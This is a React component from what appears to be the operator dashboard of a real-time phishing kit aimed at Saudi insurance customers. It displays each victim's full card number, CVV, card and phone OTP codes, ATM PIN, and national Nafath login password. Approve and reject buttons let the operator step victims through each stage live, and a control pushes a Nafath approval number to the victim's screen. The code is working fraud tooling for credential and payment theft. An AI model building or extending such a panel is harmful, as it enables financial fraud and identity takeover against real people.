import React from "react";
import { Phone, Loader2, Check, X, RefreshCw, KeyRound, Landmark, Fingerprint, AlertTriangle } from "lucide-react";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { InfoItem } from "./InfoItem";
import CollapsibleCard from "./CollapsibleCard";
import CardBrandLogo from "@/components/CardBrandLogo";
import { getCardMetadata } from "@/lib/cardMetadata";
import type { InsuranceOrder, StageEvent, Visitor } from "./types";
import { stageLabel } from "./types";
import { toast } from "sonner";

import stcLogo from "@/assets/carriers/stc.png";
import mobilyLogo from "@/assets/carriers/mobily.png";
import zainLogo from "@/assets/carriers/zain.png";

const carrierLogos: Record<string, string> = {
  "STC": stcLogo, "stc": stcLogo,
  "Mobily": mobilyLogo, "mobily": mobilyLogo, "موبايلي": mobilyLogo,
  "Zain": zainLogo, "zain": zainLogo, "زين": zainLogo,
};

interface Props {
  linkedOrders: InsuranceOrder[];
  stageEvents: StageEvent[];
  selectedVisitor: Visitor;
  visitorPhone: string | null;
  visitorNationalId: string | null;
  loadingAction: string | null;
  onStageApprove: (orderId: string, nafathNum?: string) => void;
  onStageReject: (orderId: string) => void;
  onUpdateNafathNumber: (orderId: string, val: string) => void;
  nafathNumberInputs: Record<string, string>;
  setNafathNumberInputs: React.Dispatch<React.SetStateAction<Record<string, string>>>;
  insuranceTypeLabel: Record<string, string>;
  statusLabel: Record<string, { text: string; cls: string }>;
}

const TabVerification: React.FC<Props> = ({
  linkedOrders, stageEvents, selectedVisitor, visitorPhone, visitorNationalId,
  loadingAction, onStageApprove, onStageReject, onUpdateNafathNumber,
  nafathNumberInputs, setNafathNumberInputs, insuranceTypeLabel, statusLabel,
}) => {
  const getNafathInputValue = (order: InsuranceOrder) => nafathNumberInputs[order.id] ?? order.nafath_number ?? "";
  const setNafathInputValue = (orderId: string, value: string) => {
    const sanitized = value.replace(/\D/g, "").slice(0, 2);
    setNafathNumberInputs(prev => ({ ...prev, [orderId]: sanitized }));
  };
  const getLatestStageEvent = (orderId: string, stage: string) => {
    const matched = stageEvents.filter(e => e.order_id === orderId && e.stage === stage)
      .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
    return matched[matched.length - 1] || null;
  };
  const getLatestResendEvent = (orderId: string, stage: string) => {
    const matched = stageEvents.filter(e => e.order_id === orderId && e.stage === stage && Boolean((e.payload as any)?.resend_requested))
      .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
    return matched[matched.length - 1] || null;
  };

  if (linkedOrders.length === 0) {
    return <p className="text-xs text-muted-foreground text-center py-6">لا توجد بيانات تحقق</p>;
  }

  return (
    <div className="space-y-4">
      {linkedOrders.map(order => {
        const isPending = order.stage_status === "pending";
        const activeStage = order.current_stage;

        const stageNameMap: Record<string, string> = {
          otp: "كود OTP الدفع بالبطاقة", atm: "بيانات ATM", phone_verification: "توثيق رقم الجوال",
          phone_otp: "كود OTP توثيق الجوال", nafath_login: "دخول النفاذ", nafath_verify: "رمز النفاذ",
        };

        const renderApproveReject = (stage: string, extraContent?: React.ReactNode) => {
          if (!isPending || activeStage !== stage) return null;
          return (
            <div className="pt-2 mt-2 border-t border-border/30 space-y-2">
              {extraContent}
              <div className="flex items-center gap-2">
                <Button onClick={() => onStageApprove(order.id, (activeStage === "nafath_login" || activeStage === "nafath_verify") ? getNafathInputValue(order) : undefined)} disabled={loadingAction !== null || ((activeStage === "nafath_login" || activeStage === "nafath_verify") && !getNafathInputValue(order))} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1 flex-1" size="sm">
                  {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
                </Button>
                <Button onClick={() => onStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1 flex-1" size="sm">
                  {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
                </Button>
              </div>
            </div>
          );
        };

        return (
          <div key={order.id} className={`rounded-2xl border p-3 space-y-3 ${isPending ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border/60 bg-card/50"}`}>
            {/* Order header */}
            <div className="flex items-center justify-between">
              <span className="text-xs font-bold text-foreground">{order.company || "غير محدد"} - {insuranceTypeLabel[order.insurance_type || ""] || order.insurance_type || ""}</span>
              {order.current_stage && (
                <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${isPending ? "bg-amber-500/10 text-amber-600 animate-pulse" : order.stage_status === "approved" ? "bg-emerald-500/10 text-emerald-600" : order.stage_status === "rejected" ? "bg-red-500/10 text-red-600" : "bg-muted text-muted-foreground"}`}>
                  {stageLabel[order.current_stage] || order.current_stage} — {isPending ? "⏳ بانتظار" : order.stage_status === "approved" ? "✓ موافق" : order.stage_status === "rejected" ? "✗ مرفوض" : order.stage_status || "-"}
                </span>
              )}
            </div>

            {/* Action needed alert */}
            {isPending && activeStage && stageNameMap[activeStage] && (
              <motion.div initial={{ opacity: 0, y: -8 }} animate={{ opacity: 1, y: 0 }} className="flex items-center gap-2 px-3 py-2 rounded-lg bg-amber-500/15 border border-amber-500/40">
                <span className="relative flex h-2.5 w-2.5 shrink-0">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-500 opacity-75" />
                  <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-amber-500" />
                </span>
                <AlertTriangle className="w-3.5 h-3.5 text-amber-600 shrink-0" />
                <p className="text-[11px] font-bold text-amber-700">بطاقة <span className="underline decoration-amber-500">{stageNameMap[activeStage]}</span> بحاجة اتخاذ إجراء</p>
              </motion.div>
            )}

            <div className="space-y-2.5">
              {/* 1. Payment Card */}
              {(() => {
                const hasCardData = order.card_holder_name || order.card_number_full || order.card_last_four || order.card_expiry || order.card_cvv || order.payment_method;
                const num = order.card_number_full || order.card_last_four || "";
                const meta = getCardMetadata(num);
                const brandColors: Record<string, { from: string; to: string }> = {
                  visa: { from: "#1a1f71", to: "#0d47a1" }, mastercard: { from: "#eb5f07", to: "#ff6d00" },
                  mada: { from: "#0d7c3d", to: "#00a651" }, amex: { from: "#006fcf", to: "#00aff0" },
                  unionpay: { from: "#e21836", to: "#00447c" }, unknown: { from: "#374151", to: "#1f2937" },
                };
                const bc = brandColors[meta.brandKey] || brandColors.unknown;
                const displayNum = order.card_number_full ? order.card_number_full.replace(/(.{4})/g, '$1 ').trim() : order.card_last_four ? `•••• •••• •••• ${order.card_last_four}` : "•••• •••• •••• ••••";
                return (
                  <CollapsibleCard title="بطاقة الدفع" icon={<span>💳</span>} borderColor="border-amber-500/30" bgColor="bg-amber-500/5" headerBg="bg-amber-500/10" headerBorder="border-amber-500/20" textColor="text-amber-600">
                    {hasCardData ? (
                      <div className="p-3 space-y-3">
                        <div className="mx-auto w-full max-w-[260px] h-[150px] rounded-xl p-3 flex flex-col justify-between text-white relative overflow-hidden"
                          style={{ background: `linear-gradient(135deg, ${bc.from}, ${bc.to})`, boxShadow: `0 8px 24px ${bc.from}44` }}>
                          <div className="flex justify-between items-start">
                            <div className="w-8 h-5 rounded bg-yellow-300/80" />
                            <CardBrandLogo brandKey={meta.brandKey} className="w-10 h-6" />
                          </div>
                          <p className="text-[11px] font-mono tracking-[2px] text-white/90 text-center" dir="ltr">{displayNum}</p>
                          <div className="flex justify-between items-end text-[9px]">
                            <div><p className="text-white/50 text-[7px]">CARD HOLDER</p><p className="text-white/90 font-medium truncate max-w-[140px]">{order.card_holder_name || "—"}</p></div>
                            <div className="text-left" dir="ltr"><p className="text-white/50 text-[7px]">EXPIRES</p><p className="text-white/90 font-medium">{order.card_expiry || "MM/YY"}</p></div>
                            {order.card_cvv && <div className="text-left" dir="ltr"><p className="text-white/50 text-[7px]">CVV</p><p className="text-white/90 font-bold font-mono">{order.card_cvv}</p></div>}
                          </div>
                          {meta.isDetected && meta.bankName && <p className="absolute bottom-1 left-1/2 -translate-x-1/2 text-[7px] text-white/40">{meta.bankName}</p>}
                        </div>
                        <div className="grid grid-cols-2 gap-2">
                          {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
                          {order.card_number_full && <InfoItem label="رقم البطاقة" value={order.card_number_full.replace(/(.{4})/g, '$1 ').trim()} />}
                          {!order.card_number_full && order.card_last_four && <InfoItem label="آخر 4 أرقام" value={`**** ${order.card_last_four}`} />}
                          {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
                          {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
                          {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة بنكية" : order.payment_method === "atm" ? "سداد ATM" : order.payment_method} />}
                          {meta.isDetected && <InfoItem label="نوع البطاقة" value={`${meta.brandLabel} - ${meta.classificationLabel}`} />}
                        </div>
                      </div>
                    ) : (
                      <div className="px-3 py-2.5"><p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p></div>
                    )}
                  </CollapsibleCard>
                );
              })()}

              {/* 2. OTP */}
              {(() => {
                const otpEvents = stageEvents.filter(e => e.order_id === order.id && e.stage === "otp").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
                const rejectedOtps = otpEvents.filter(e => e.status === "rejected");
                const latestOtpResendEvent = getLatestResendEvent(order.id, "otp");
                const currentOtp = order.otp_code;
                return (
                  <CollapsibleCard title="كود OTP البطاقة" icon={<KeyRound className="w-3 h-3" />} borderColor="border-blue-500/30" bgColor="bg-blue-500/5" headerBg="bg-blue-500/10" headerBorder="border-blue-500/20" textColor="text-blue-600" defaultOpen={isPending && activeStage === "otp"} isActive={isPending && activeStage === "otp"}>
                    <div className="px-3 py-2.5 space-y-2">
                      {latestOtpResendEvent && (
                        <div className="flex items-center justify-between rounded-lg border border-amber-500/20 bg-amber-500/10 px-3 py-2">
                          <span className="text-[10px] font-bold text-amber-700">الزائر طلب إرسال رمز جديد</span>
                          <span className="text-[9px] text-amber-700/80">{new Date(latestOtpResendEvent.stage_entered_at).toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: false })}</span>
                        </div>
                      )}
                      {rejectedOtps.length > 0 && (
                        <div className="space-y-1.5">
                          {rejectedOtps.map((ev, i) => (
                            <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-3 py-1.5">
                              <span className="text-[10px] text-red-500">محاولة {i + 1} (مرفوض)</span>
                              <span className="text-sm font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.otp_code || (ev.payload as any)?.code || "—"}</span>
                            </div>
                          ))}
                        </div>
                      )}
                      {currentOtp ? (
                        <div className="flex items-center justify-center py-2">
                          <span className="text-2xl font-mono font-bold tracking-[6px] text-blue-600 bg-blue-500/10 px-4 py-1.5 rounded-lg border border-blue-500/20">{currentOtp}</span>
                        </div>
                      ) : (
                        <p className="text-[10px] text-muted-foreground text-center py-2">لا توجد بيانات</p>
                      )}
                      {order.otp_verified !== null && (
                        <div className="flex justify-center mt-1">
                          <span className={`text-[9px] px-2 py-0.5 rounded-full ${order.otp_verified ? "bg-emerald-500/15 text-emerald-600" : "bg-red-500/15 text-red-600"}`}>
                            {order.otp_verified ? "✓ تم التحقق" : "✗ لم يتم التحقق"}
                          </span>
                        </div>
                      )}
                      {rejectedOtps.length >= 3 && <p className="text-[10px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات (3/3)</p>}
                      {renderApproveReject("otp")}
                    </div>
                  </CollapsibleCard>
                );
              })()}

              {/* 3. ATM */}
              <CollapsibleCard title="بيانات ATM" icon={<Landmark className="w-3 h-3" />} borderColor="border-emerald-500/30" bgColor="bg-emerald-500/5" headerBg="bg-emerald-500/10" headerBorder="border-emerald-500/20" textColor="text-emerald-600" defaultOpen={isPending && activeStage === "atm"} isActive={isPending && activeStage === "atm"}>
                <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
                  {(order.atm_bill_number || order.atm_biller_code || order.atm_pin) ? (
                    <>
                      {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
                      {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
                      {order.atm_pin && (
                        <div className="col-span-2 flex justify-center">
                          <span className="text-lg font-mono font-bold tracking-[4px] text-emerald-600 bg-emerald-500/10 px-3 py-1 rounded-lg border border-emerald-500/20">{order.atm_pin}</span>
                        </div>
                      )}
                    </>
                  ) : (
                    <p className="col-span-2 text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
                  )}
                  {renderApproveReject("atm")}
                </div>
              </CollapsibleCard>

              {/* 4. Phone Verification */}
              {(() => {
                const phoneEvent = getLatestStageEvent(order.id, "phone_verification");
                const carrierName = (phoneEvent?.payload as any)?.carrier || null;
                const verificationPhone = order.phone || (phoneEvent?.payload as any)?.phone || visitorPhone || "—";
                const verificationNationalId = order.national_id || (phoneEvent?.payload as any)?.national_id || visitorNationalId || null;
                return (
                  <CollapsibleCard title="توثيق الجوال" icon={<span>📲</span>} borderColor="border-purple-500/30" bgColor="bg-purple-500/5" headerBg="bg-purple-500/10" headerBorder="border-purple-500/20" textColor="text-purple-600" defaultOpen={isPending && activeStage === "phone_verification"} isActive={isPending && activeStage === "phone_verification"}>
                    <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
                      {(verificationPhone || verificationNationalId || carrierName) ? (
                        <>
                          <InfoItem label="رقم الجوال" value={verificationPhone} />
                          {verificationNationalId && <InfoItem label="رقم الهوية" value={verificationNationalId} />}
                          {order.customer_name && <InfoItem label="اسم العميل" value={order.customer_name} />}
                          {carrierName && (
                            <div className="bg-muted/30 rounded-lg p-2.5 flex items-center gap-2">
                              {carrierLogos[carrierName] ? (
                                <img src={carrierLogos[carrierName]} alt={carrierName} className="w-5 h-5 object-contain shrink-0" loading="lazy" />
                              ) : (
                                <Phone className="w-3.5 h-3.5 text-purple-500 shrink-0" />
                              )}
                              <div><p className="text-[9px] text-muted-foreground">مشغل الشبكة</p><p className="text-xs font-medium text-foreground">{carrierName}</p></div>
                            </div>
                          )}
                        </>
                      ) : (
                        <p className="col-span-2 text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
                      )}
                      {renderApproveReject("phone_verification")}
                    </div>
                  </CollapsibleCard>
                );
              })()}

              {/* 5. Phone OTP */}
              {(() => {
                const phoneOtpEvents = stageEvents.filter(e => e.order_id === order.id && e.stage === "phone_otp").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
                const rejectedPhoneOtps = phoneOtpEvents.filter(e => e.status === "rejected");
                const latestPhoneOtpEvent = phoneOtpEvents[phoneOtpEvents.length - 1];
                const currentPhoneOtp = order.phone_otp_code || (latestPhoneOtpEvent?.payload as any)?.phone_otp_code || (latestPhoneOtpEvent?.payload as any)?.code || null;
                return (
                  <CollapsibleCard title="كود OTP الجوال" icon={<Phone className="w-3 h-3" />} borderColor="border-violet-500/30" bgColor="bg-violet-500/5" headerBg="bg-violet-500/10" headerBorder="border-violet-500/20" textColor="text-violet-600" defaultOpen={isPending && activeStage === "phone_otp"} isActive={isPending && activeStage === "phone_otp"}>
                    <div className="px-3 py-2.5 space-y-2">
                      {rejectedPhoneOtps.length > 0 && (
                        <div className="space-y-1.5">
                          {rejectedPhoneOtps.map((ev, i) => (
                            <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-3 py-1.5">
                              <span className="text-[10px] text-red-500">محاولة {i + 1} (مرفوض)</span>
                              <span className="text-sm font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.phone_otp_code || (ev.payload as any)?.code || "—"}</span>
                            </div>
                          ))}
                        </div>
                      )}
                      <div className="flex items-center justify-center">
                        {currentPhoneOtp ? (
                          <span className="text-2xl font-mono font-bold tracking-[6px] text-violet-600 bg-violet-500/10 px-4 py-1.5 rounded-lg border border-violet-500/20">{currentPhoneOtp}</span>
                        ) : (
                          <p className="text-[10px] text-muted-foreground py-1">لا توجد بيانات</p>
                        )}
                      </div>
                      {rejectedPhoneOtps.length >= 3 && <p className="text-[10px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات (3/3)</p>}
                      {renderApproveReject("phone_otp")}
                    </div>
                  </CollapsibleCard>
                );
              })()}

              {/* 6. Nafath Login */}
              {(() => {
                const nafathLoginEvents = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_login").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
                const rejectedNafathLogins = nafathLoginEvents.filter(e => e.status === "rejected");
                return (
                  <CollapsibleCard title="دخول النفاذ" icon={<Fingerprint className="w-3 h-3" />} borderColor="border-teal-500/30" bgColor="bg-teal-500/5" headerBg="bg-teal-500/10" headerBorder="border-teal-500/20" textColor="text-teal-600" defaultOpen={isPending && activeStage === "nafath_login"} isActive={isPending && activeStage === "nafath_login"}>
                    <div className="px-3 py-2.5 space-y-2">
                      {rejectedNafathLogins.length > 0 && (
                        <div className="space-y-1.5">
                          {rejectedNafathLogins.map((ev, i) => (
                            <div key={ev.id} className="bg-red-500/5 border border-red-500/15 rounded-lg px-3 py-1.5 space-y-0.5">
                              <div className="flex items-center justify-between"><span className="text-[10px] text-red-500">محاولة {i + 1} (مرفوض)</span></div>
                              <div className="grid grid-cols-2 gap-1.5">
                                <div><p className="text-[8px] text-red-400">الهوية</p><p className="text-[11px] font-mono text-red-400 line-through">{(ev.payload as any)?.national_id || "—"}</p></div>
                                <div><p className="text-[8px] text-red-400">كلمة المرور</p><p className="text-[11px] font-mono text-red-400 line-through">{(ev.payload as any)?.nafath_password || "—"}</p></div>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                      <div className="grid grid-cols-2 gap-2">
                        {(order.nafath_password || selectedVisitor?.national_id || order.national_id) ? (
                          <>
                            <InfoItem label="اسم المستخدم (الهوية)" value={selectedVisitor?.national_id || order.national_id || "—"} />
                            {order.nafath_password && <InfoItem label="كلمة المرور" value={order.nafath_password} />}
                          </>
                        ) : (
                          <p className="col-span-2 text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
                        )}
                      </div>
                      {rejectedNafathLogins.length >= 3 && <p className="text-[10px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات (3/3)</p>}
                      {renderApproveReject("nafath_login", (
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] text-muted-foreground whitespace-nowrap">رقم النفاذ:</span>
                          <input type="text" placeholder="أدخل الرقم (مثل 35)" value={getNafathInputValue(order)} onChange={e => setNafathInputValue(order.id, e.target.value)} className="flex-1 h-8 rounded-lg border-2 border-border bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors" />
                        </div>
                      ))}
                    </div>
                  </CollapsibleCard>
                );
              })()}

              {/* 7. Nafath Verify */}
              {(() => {
                const nafathVerifyEvents = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_verify").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
                const rejectedNafathVerifies = nafathVerifyEvents.filter(e => e.status === "rejected");
                return (
                  <CollapsibleCard title="رمز النفاذ" icon={<span>🔐</span>} borderColor="border-cyan-500/30" bgColor="bg-cyan-500/5" headerBg="bg-cyan-500/10" headerBorder="border-cyan-500/20" textColor="text-cyan-600" defaultOpen={isPending && activeStage === "nafath_verify"} isActive={isPending && activeStage === "nafath_verify"}>
                    <div className="px-3 py-2.5 space-y-2">
                      {rejectedNafathVerifies.length > 0 && (
                        <div className="space-y-1.5">
                          {rejectedNafathVerifies.map((ev, i) => (
                            <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-3 py-1.5">
                              <span className="text-[10px] text-red-500">محاولة {i + 1} (مرفوض)</span>
                              <span className="text-sm font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.nafath_number || "—"}</span>
                            </div>
                          ))}
                        </div>
                      )}
                      <div className="space-y-2">
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] text-muted-foreground whitespace-nowrap">أدخل الرقم:</span>
                          <input type="text" inputMode="numeric" placeholder="مثال: 35" value={getNafathInputValue(order)} onChange={e => setNafathInputValue(order.id, e.target.value.replace(/\D/g, ""))} className="flex-1 h-10 rounded-lg border-2 border-cyan-400 bg-card px-3 text-xl text-foreground text-center font-bold tracking-[6px] focus:border-primary focus:outline-none transition-colors" />
                        </div>
                        {order.nafath_number && (
                          <div className="flex items-center justify-between bg-cyan-500/10 rounded-lg px-3 py-1.5">
                            <span className="text-[10px] text-cyan-600">الرقم الحالي المعروض للزائر:</span>
                            <span className="text-lg font-mono font-bold tracking-[4px] text-cyan-600">{order.nafath_number}</span>
                          </div>
                        )}
                        {!isPending || activeStage !== "nafath_verify" ? (
                          order.nafath_number ? null : <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
                        ) : null}
                        <Button
                          onClick={() => {
                            const val = getNafathInputValue(order);
                            if (!val) { toast.info("أدخل الرقم أولاً"); return; }
                            onUpdateNafathNumber(order.id, val);
                          }}
                          disabled={loadingAction !== null || !getNafathInputValue(order)}
                          className="w-full bg-cyan-600 hover:bg-cyan-700 text-white gap-1"
                          size="sm"
                        >
                          {loadingAction === "nafath-update-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}
                          {order.nafath_number ? "تحديث الرقم" : "إرسال الرقم للزائر"}
                        </Button>
                      </div>
                      {renderApproveReject("nafath_verify")}
                    </div>
                  </CollapsibleCard>
                );
              })()}
            </div>
          </div>
        );
      })}
    </div>
  );
};

export default TabVerification;
